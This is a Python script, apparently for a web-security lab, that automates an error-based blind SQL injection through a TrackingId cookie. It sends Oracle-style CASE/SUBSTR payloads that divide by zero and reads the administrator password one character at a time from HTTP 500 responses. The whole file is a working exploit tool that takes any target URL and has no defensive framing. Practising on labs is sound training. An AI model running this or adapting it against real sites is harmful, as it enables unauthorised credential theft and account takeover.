import sys
import urllib.parse
import requests
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

default_proxies = {'http': "http://127.0.0.1:8080", 'https': "http://127.0.0.1:8080"}

def sqli(url,session,trackid, proxies=None):
    password = ""
    j = 1
    arr="abcdefghijklmnopqrstuvwxyz0123456789"
    print("\n[+] Starting SQL injection attack...")
    while True:
        found = False

        for i in arr:  
            sqli_payload = f"'||(SELECT CASE WHEN SUBSTR(password,{j},1)='{i}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            
            cookie = {
                "TrackingId": f"{trackid}{sqli_payload_encoded}",  
                "session": f"{session}"
            }

            try:
                
                response = requests.get(url, cookies=cookie, verify=False, proxies=proxies)

                
                if 500 == response.status_code:  
                    password += i
                    sys.stdout.write(f"\r[+] Current password: {password}")  
                    sys.stdout.flush()
                    j += 1  
                    found = True
                    break

            except requests.exceptions.RequestException as e:
                print(f"\n[!] Request error: {e}")
                return

        
        if not found:
            break

    print(f"\n[+] Administrator password retrieved: {password}")

def main():
    
    parser = argparse.ArgumentParser(description="SQL Injection Tool for Blind SQLi via Cookies")

    
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://www.example.com/)")
    parser.add_argument("-t", "--trackingid", required=True, help="TrackingId cookie value to be exploited")
    parser.add_argument("-s", "--session", required=True, help="Session cookie value for authenticated access")
    parser.add_argument("-p", "--proxy", action="store_true", help="Use proxy (default: Burp Suite on 127.0.0.1:8080)")

    
    args = parser.parse_args()

    
    url = args.url
    trackid = args.trackingid
    session = args.session

    if not url.startswith("http://") and not url.startswith("https://"):
        print("[!] Invalid URL format. Ensure the URL starts with 'http://' or 'https://'.")
        return

    proxies = default_proxies if args.proxy else None

    print("[+] Target URL:", url)
    print("[+] Using TrackingId value :", trackid)
    print("[+] Using Session vlaue :", session)

    if args.proxy:
        print("[+] Proxy enabled. Requests will be routed through:", default_proxies["http"])
    else:
        print("[+] Proxy disabled. Direct connection will be used.")

    print("\n[+] Retrieving administrator password...")
    sqli(url, session, trackid, proxies)

if __name__ == "__main__":
    main()
